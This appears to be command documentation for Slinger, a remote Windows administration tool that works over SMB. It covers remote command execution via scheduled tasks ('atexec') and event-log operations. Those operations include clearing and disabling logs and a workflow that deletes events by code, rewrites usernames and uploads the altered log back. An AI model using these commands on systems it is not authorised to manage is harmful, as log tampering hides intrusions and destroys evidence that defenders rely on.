## `debug-availcounters`

**Description:** Display available performance counters on the remote server.  This is for debug use only, it doesn't really give you anything.

**Help:**
```
debug-availcounters [-h] [-f FILTER] [-p] [-s filename]
Display available performance counters on the remote server.  This is for debug use only, it doesn't really give you anything.
```

**Example Usage:**
```
Example Usage: availcounters
```

### Arguments

- **`filter`**: Simple filter for case insenstive counters containing a given string
  - Required: No

- **`save`**: Save the available counters to a file
  - Required: No

---

## `debug-counter`

**Description:** Display a performance counter on the remote server.  This is for debug use only, it doesn't really give you anything.

**Help:**
```
debug-counter [-h] [-c COUNTER] [-a {x86,x64,unk}] [-i]
Display a performance counter on the remote server.  This is for debug use only, it doesn't really give you anything.
```

**Example Usage:**
```
Example Usage: counter -c 123 [-a x86]
```

### Arguments

- **`counter`**: Specify the counter to display
  - Required: No

- **`arch`**: Specify the architecture of the remote server
  - Choices: x86, x64, unk
  - Default: `unk`
  - Required: No

---

## `network`

**Description:** Display network information on the remote server

**Help:**
```
network [-h] [-tcp] [-rdp]
Display network information on the remote server
```

**Example Usage:**
```
Example Usage: network
```

---

## `atexec`

**Description:** Execute a command on the remote server

**Help:**
```
atexec [-h] -c COMMAND -sp PATH [-sn SAVE_NAME] -tn NAME [-ta AUTHOR] [-td DESCRIPTION] [-tf FOLDER] [-sh SHARE] [--shell] [-w WAIT]
Execute a command on the remote server
```

**Example Usage:**
```
Example Usage: atexec -tn "NetSvc" -sh C$ -sp \\Users\\Public\\Downloads\\ -c ipconfig
```

### Arguments

- **`command`**: Specify the command to execute
  - Required: Yes

- **`path`**: Specify the folder to save the output file
  - Default: `\Users\Public\Downloads\`
  - Required: Yes

- **`save_name`**: Specify the name of the output file.  Default is <random 8-10 chars>.txt
  - Required: No

- **`name`**: Specify the name of the scheduled task
  - Required: Yes

- **`author`**: Specify the author of the scheduled task
  - Default: `Slinger`
  - Required: No

- **`description`**: Specify the description of the scheduled task
  - Default: `Scheduled task created by Slinger`
  - Required: No

- **`folder`**: Specify the folder to run the task in
  - Default: `\Windows`
  - Required: No

- **`share`**: Specify the share name to connect to
  - Default: `C$`
  - Required: No

- **`wait`**: Seconds to wait for the task to complete
  - Default: `1`
  - Required: No

---

## `reload`

**Description:** Reload the current sessions context

**Help:**
```
reload [-h]
Reload the current sessions context
```

**Example Usage:**
```
Example Usage: reload
```

---

## `plugins`

**Description:** List available plugins

**Help:**
```
plugins [-h]
List available plugins
```

**Example Usage:**
```
Example Usage: plugins
```

---

## `eventlog`

**Description:** Windows Event Log operations via WMI - Query, monitor, and manage Windows Event Logs

**Help:**
```
eventlog [-h] {query,list,clear,backup,monitor,enable,disable,clean}
Query, monitor, and manage Windows Event Logs via WMI
```

**Example Usage:**
```
eventlog query -log System -type Error -count 50           # Query 50 error events from System log
eventlog monitor -log Security -timeout 300 -filter "EventCode=4625"  # Monitor failed logins
eventlog clear -log Application --backup /tmp/app_backup.evt           # Clear with backup
eventlog clean -log System -method local --backup                      # Advanced cleaning
```

### Subcommands

#### `eventlog query`
Query Windows Event Log entries with filtering
```
-log <name>        Event log name (System, Application, Security, etc.) [Required]
-id <number>       Specific event ID to filter
-type <level>      Event level (error, warning, information, success, failure)
-since <date>      Events since date (YYYY-MM-DD or 'YYYY-MM-DD HH:MM:SS')
-count <number>    Maximum number of events to return (default: 100)
-source <name>     Filter by event source name
-format <format>   Output format (table, json, list, csv) (default: table)
-o <file>          Save output to file
```

#### `eventlog list`
List all available event logs on the remote system

#### `eventlog clear`
Clear specified event log with optional backup
```
-log <name>        Event log name to clear [Required]
--backup <file>    Backup log to file before clearing
--force           Clear without backup confirmation
```

#### `eventlog backup`
Backup event log to file
```
-log <name>        Event log name to backup [Required]
-o <file>          Output file path for backup [Required]
```

#### `eventlog monitor`
Monitor event log for new entries in real-time
```
-log <name>        Event log name to monitor [Required]
-timeout <seconds> Monitoring timeout in seconds (default: 300)
-filter <wql>      WQL filter for events (e.g., 'EventCode=4625')
--interactive      Enable interactive commands during monitoring
```

**Interactive monitoring commands:**
- `Ctrl+C` - Stop monitoring but maintain SMB connection
- `q` + Enter - Quit gracefully with summary
- `s` + Enter - Show current statistics
- `p` + Enter - Pause/Resume monitoring

#### `eventlog enable/disable`
Enable or disable event logging for specified log
```
-log <name>        Event log name to enable/disable [Required]
```

#### `eventlog clean`
Advanced event log cleaning with local processing
```
-log <name>        Event log name to clean [Required]
-method <type>     Cleaning method: local (download/process/upload) or upload (default: local)
--backup <file>    Backup original log before cleaning
--from <file>      Upload cleaned log from local file (use with -method upload)
```

### Bang Commands for Local Log Processing

After downloading logs with `eventlog clean -method local`, use these bang commands:

#### `! logparse <logfile> [options]`
Parse and analyze downloaded log files
```
--analyze          Perform detailed analysis with statistics
--show-summary     Show event summary information
--verify           Verify log file integrity
```

#### `! logclean <logfile> [options]`
Clean log files by removing specific events
```
--remove-pattern <pattern>     Remove events matching pattern
--remove-eventcode <codes>     Remove events with specific codes (comma-separated)
--remove-source <source>       Remove events from specific source
--time-range <start> <end>     Remove events in time range
```

#### `! logreplace <logfile> [options]`
Replace patterns in log events
```
--pattern <regex>      Regular expression pattern to find
--replace <text>       Replacement text
--field <fieldname>    Target field (default: Message)
```

#### `! logmerge <output> <log1> <log2> [options]`
Merge multiple log files
```
--sort-by-time         Sort merged events chronologically
```

#### `! logexport <logfile> [options]`
Export logs to different formats
```
--format <type>        Export format (json, csv, xml)
--output <file>        Output file path
```

#### `! logstats <logfile> [options]`
Generate log file statistics
```
--detailed             Show detailed statistics breakdown
```

### Example Workflow

```bash
# 1. Download and clean a log locally
eventlog clean -log Application -method local --backup

# 2. Use bang commands to process the downloaded log
! logparse /tmp/Application_1234567890.evt --analyze
! logclean /tmp/Application_1234567890.evt --remove-eventcode "1001,1002"
! logreplace /tmp/Application_1234567890.evt.cleaned --pattern "UserName=.*" --replace "UserName=REDACTED"

# 3. Upload the cleaned log back
eventlog clean -log Application -method upload --from /tmp/Application_1234567890.evt.cleaned
```

---
